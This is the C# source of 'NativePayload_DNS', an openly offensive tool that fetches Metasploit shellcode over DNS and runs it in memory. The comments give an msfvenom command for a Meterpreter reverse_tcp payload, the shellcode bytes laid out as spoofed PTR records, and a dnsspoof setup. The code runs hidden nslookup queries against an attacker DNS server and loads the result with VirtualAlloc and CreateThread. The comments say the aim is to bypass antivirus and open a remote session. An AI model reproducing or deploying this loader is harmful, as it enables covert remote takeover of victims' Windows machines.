using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;
// General Information about an assembly is controlled through the following 
// set of attributes. Change these attribute values to modify the information
// associated with an assembly.
[assembly: AssemblyTitle("NativePayload_DNS")]
[assembly: AssemblyDescription("Publisher and Author: Damon Mohammadbagher")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("NativePayload_DNS")]
[assembly: AssemblyCopyright("Copyright ©  2017")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]

// Setting ComVisible to false makes the types in this assembly not visible 
// to COM components.  If you need to access a type in this assembly from 
// COM, set the ComVisible attribute to true on that type.
[assembly: ComVisible(false)]

// The following GUID is for the ID of the typelib if this project is exposed to COM
[assembly: Guid("8b88b2b1-3d5e-44bc-95f5-1439924da5b7")]

// Version information for an assembly consists of the following four values:
//
//      Major Version
//      Minor Version 
//      Build Number
//      Revision
//
// You can specify all the values or you can default the Build and Revision Numbers 
// by using the '*' as shown below:
// [assembly: AssemblyVersion("1.0.*")]
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]

namespace NativePayload_DNS
{
    class Program
    {
        static void Main(string[] args)
        {
            string _DnsServer = "192.168.1.50";
            /// 1.1.1.{x} ==> x = 0 ... 33 
            string _IPaddress_Begin = "1.1.1.";             
            int _IPaddress_Counter = 34;

            /// 
            /// step 1:
            /// msfvenom C type payload in your kali linux
            /// msfvenom –-platform windows –arch x86_64 –p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.50 –f c > /root/Desktop/payload.txt
            /// copy payloads from payload.txt file to dns.txt like this format:
            /// 
            /// 
            /// root@kali:~# cat /root/Desktop/dns.txt
            ///
            ///1.1.1.0 "0xfc0x480x830xe40xf00xe80xcc0x000x000x000x410x510x410x500x52.1.com"
            ///1.1.1.1 "0x510x560x480x310xd20x650x480x8b0x520x600x480x8b0x520x180x48.1.com"
            ///1.1.1.2 "0x8b0x520x200x480x8b0x720x500x480x0f0xb70x4a0x4a0x4d0x310xc9.1.com"
            ///1.1.1.3 "0x480x310xc00xac0x3c0x610x7c0x020x2c0x200x410xc10xc90x0d0x41.1.com"
            ///1.1.1.4 "0x010xc10xe20xed0x520x410x510x480x8b0x520x200x8b0x420x3c0x48.1.com"
            ///1.1.1.5 "0x010xd00x660x810x780x180x0b0x020x0f0x850x720x000x000x000x8b.1.com"
            ///1.1.1.6 "0x800x880x000x000x000x480x850xc00x740x670x480x010xd00x500x8b.1.com"
            ///1.1.1.7 "0x480x180x440x8b0x400x200x490x010xd00xe30x560x480xff0xc90x41.1.com"
            ///1.1.1.8 "0x8b0x340x880x480x010xd60x4d0x310xc90x480x310xc00xac0x410xc1.1.com"
            ///1.1.1.9 "0xc90x0d0x410x010xc10x380xe00x750xf10x4c0x030x4c0x240x080x45.1.com"
            ///1.1.1.10 "0x390xd10x750xd80x580x440x8b0x400x240x490x010xd00x660x410x8b.1.com"
            ///1.1.1.11 "0x0c0x480x440x8b0x400x1c0x490x010xd00x410x8b0x040x880x480x01.1.com"
            ///1.1.1.12 "0xd00x410x580x410x580x5e0x590x5a0x410x580x410x590x410x5a0x48.1.com"
            ///1.1.1.13 "0x830xec0x200x410x520xff0xe00x580x410x590x5a0x480x8b0x120xe9.1.com"
            ///1.1.1.14 "0x4b0xff0xff0xff0x5d0x490xbe0x770x730x320x5f0x330x320x000x00.1.com"
            ///1.1.1.15 "0x410x560x490x890xe60x480x810xec0xa00x010x000x000x490x890xe5.1.com"
            ///1.1.1.16 "0x490xbc0x020x000x110x5c0xc00xa80x010x320x410x540x490x890xe4.1.com"
            ///1.1.1.17 "0x4c0x890xf10x410xba0x4c0x770x260x070xff0xd50x4c0x890xea0x68.1.com"
            ///1.1.1.18 "0x010x010x000x000x590x410xba0x290x800x6b0x000xff0xd50x6a0x05.1.com"
            ///1.1.1.19 "0x410x5e0x500x500x4d0x310xc90x4d0x310xc00x480xff0xc00x480x89.1.com"
            ///1.1.1.20 "0xc20x480xff0xc00x480x890xc10x410xba0xea0x0f0xdf0xe00xff0xd5.1.com"
            ///1.1.1.21 "0x480x890xc70x6a0x100x410x580x4c0x890xe20x480x890xf90x410xba.1.com"
            ///1.1.1.22 "0x990xa50x740x610xff0xd50x850xc00x740x0a0x490xff0xce0x750xe5.1.com"
            ///1.1.1.23 "0xe80x930x000x000x000x480x830xec0x100x480x890xe20x4d0x310xc9.1.com"
            ///1.1.1.24 "0x6a0x040x410x580x480x890xf90x410xba0x020xd90xc80x5f0xff0xd5.1.com"
            ///1.1.1.25 "0x830xf80x000x7e0x550x480x830xc40x200x5e0x890xf60x6a0x400x41.1.com"
            ///1.1.1.26 "0x590x680x000x100x000x000x410x580x480x890xf20x480x310xc90x41.1.com"
            ///1.1.1.27 "0xba0x580xa40x530xe50xff0xd50x480x890xc30x490x890xc70x4d0x31.1.com"
            ///1.1.1.28 "0xc90x490x890xf00x480x890xda0x480x890xf90x410xba0x020xd90xc8.1.com"
            ///1.1.1.29 "0x5f0xff0xd50x830xf80x000x7d0x280x580x410x570x590x680x000x40.1.com"
            ///1.1.1.30 "0x000x000x410x580x6a0x000x5a0x410xba0x0b0x2f0x0f0x300xff0xd5.1.com"
            ///1.1.1.31 "0x570x590x410xba0x750x6e0x4d0x610xff0xd50x490xff0xce0xe90x3c.1.com"
            ///1.1.1.32 "0xff0xff0xff0x480x010xc30x480x290xc60x480x850xf60x750xb40x41.1.com"
            ///1.1.1.33 "0xff0xe70x580x6a0x000x590x490xc70xc20xf00xb50xa20x560xff0xd5.1.com"
            ///
            /// step 2: Make Fake DNS server in your kali linux
            ///root@kali:~# dnsspoof -i eth0 -f /root/Desktop/dns.txt
            /// step 3:
            /// run code in client
            /// syntax: NativePayload_DNS.exe "1.1.1." 34 "192.168.1.50"
            /// finally you can bypass AVs and you have Meterpreter Session
            ///

            try
            {
                /// IP Address for Resolve ==> IPAddress to FQDN
                _IPaddress_Begin = args[0].ToString();
                /// Number for Counter
                /// for example 1.1.1. by 34 ==> 1.1.1.0 , 1.1.1.1 ,  .... , 1.1.1.32 , 1.1.1.33
                _IPaddress_Counter = Convert.ToInt32(args[1]);
                /// Attacker Fake DNS Server 
                _DnsServer = args[2].ToString();
            }
            catch (Exception err)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("");
                Console.WriteLine("Command Syntax : NativePayload_DNS.exe \"StartIpaddress\" counter_Number_of_Records \"FakeDNS_Server\" ");
                Console.WriteLine("Command Syntax : NativePayload_DNS.exe \"1.1.1.\" 34 \"192.168.1.50\" ");
                Console.WriteLine("for more information please visit github account for this tool");
                Console.WriteLine("");
                Console.WriteLine("");
                Console.WriteLine("[1] error: {0}", err.Message);
                Console.ForegroundColor = ConsoleColor.DarkGray;

            }

            try
            {
                string[] _DATA = new string[_IPaddress_Counter];
                string DATA = "";
                Console.ForegroundColor = ConsoleColor.DarkGreen;
                Console.WriteLine("NativePayload_DNS by Damon Mohammadbagher");
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("Starting Download Backdoor Payloads by DNS Traffic from FakeDNS_Server");
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("DNS Server: {0} ", _DnsServer);
                for (int i = 0; i < _IPaddress_Counter; i++)
                {
                    _DATA[i] = __nslookup(_IPaddress_Begin + i, _DnsServer);
                    DATA += _DATA[i].ToString();
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.WriteLine("DNS Request Send: {0}", (_IPaddress_Begin + i).ToString());
                    Console.ForegroundColor = ConsoleColor.DarkYellow;
                    Console.WriteLine("DNS Response type PTR Record: {0}", _Records);
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                }

                string[] Payload__Without_delimiterChar = DATA.Split('x');
                object tmp = new object();
                byte[] __Bytes = new byte[DATA.Length / 4];
                for (int i = 1; i < __Bytes.Length; i++)
                {
                    tmp = Payload__Without_delimiterChar[i].ToString().Substring(0, 2);
                    byte current = Convert.ToByte("0x" + tmp.ToString(), 16);
                    __Bytes[i] = current;
                }

                Console.WriteLine();
                Console.WriteLine("Bingo Meterpreter session by DNS traffic ;)");
                UInt32 funcAddr = VirtualAlloc(0, (UInt32)__Bytes.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                Marshal.Copy(__Bytes, 0, (IntPtr)(funcAddr), __Bytes.Length);
                IntPtr hThread = IntPtr.Zero;
                UInt32 threadId = 0;
                IntPtr pinfo = IntPtr.Zero;
                
                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                WaitForSingleObject(hThread, 0xFFFFFFFF);

            }
            catch (Exception err2)
            {
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.WriteLine("[2] error: {0}", err2.Message);
                Console.ForegroundColor = ConsoleColor.DarkGray;
            }
        }
        public static string _Records = "";
        public static string __nslookup(string DNS_PTR_A, string DnsServer)
        {
                /// humm sometimes you need this code ;)
                ////ProcessStartInfo ipconfigflushdns = new ProcessStartInfo("ipconfig", "/flushdns");
                ////ipconfigflushdns.UseShellExecute = false;
                ////ipconfigflushdns.RedirectStandardOutput = false;
                ////Process ipflush = new Process();
                ////ipflush.StartInfo = ipconfigflushdns;
                ////ipflush.Start();

                /// Make DNS traffic for getting Meterpreter Payloads by nslookup
                ProcessStartInfo ns_Prcs_info = new ProcessStartInfo("nslookup.exe", DNS_PTR_A + " " + DnsServer);
                ns_Prcs_info.RedirectStandardInput = true;
                ns_Prcs_info.RedirectStandardOutput = true;
                ns_Prcs_info.UseShellExecute = false;
                /// you can use Thread Sleep here 

                Process nslookup = new Process();
                nslookup.StartInfo = ns_Prcs_info;
                nslookup.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                nslookup.Start();
           
                /// if you want to change your FQDN from "1.com" to "22.com"
                /// then you should change these Settings and Values too ;)
                string computerList = nslookup.StandardOutput.ReadToEnd();
                string[] lines = computerList.Split('\r', 'n');
                string last_line = lines[lines.Length - 4];
                string temp_1 = last_line.Remove(0, 11);
                _Records = "\"" + temp_1;
                int i = temp_1.LastIndexOf('.');
                string temp_2 = temp_1.Remove(i, (temp_1.Length - i));
                int b = temp_2.LastIndexOf('.');
                string final = temp_2.Remove(b, temp_2.Length - b);
                return final;            

        }

        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;        
            
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);    
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);     
       
    }
}
